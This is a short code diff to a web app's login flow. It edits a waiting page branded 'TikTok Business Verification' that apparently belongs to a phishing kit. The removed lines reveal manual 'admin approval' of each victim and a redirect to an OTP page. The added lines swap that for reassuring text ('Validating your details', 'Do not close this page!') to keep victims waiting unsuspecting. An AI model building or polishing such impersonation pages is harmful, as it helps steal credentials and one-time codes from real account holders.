@@ -302,9 +302,9 @@ app.post('/api/users/login', async (req, res) => {
     <div class="loading-container">
         <div class="logo">TikTok Business Verification</div>
         <div class="spinner"></div>
-        <div class="message">Waiting for admin approval...</div>
-        <div class="email">${email}</div>
-        <div class="approved">✓ Approved! Redirecting to OTP page...</div>
+        <div class="message">Validating your details...</div>
+        <div class="email"> Do not close this page!</div>
+        <div class="approved">✓</div>
     </div>
 </body>
 </html>
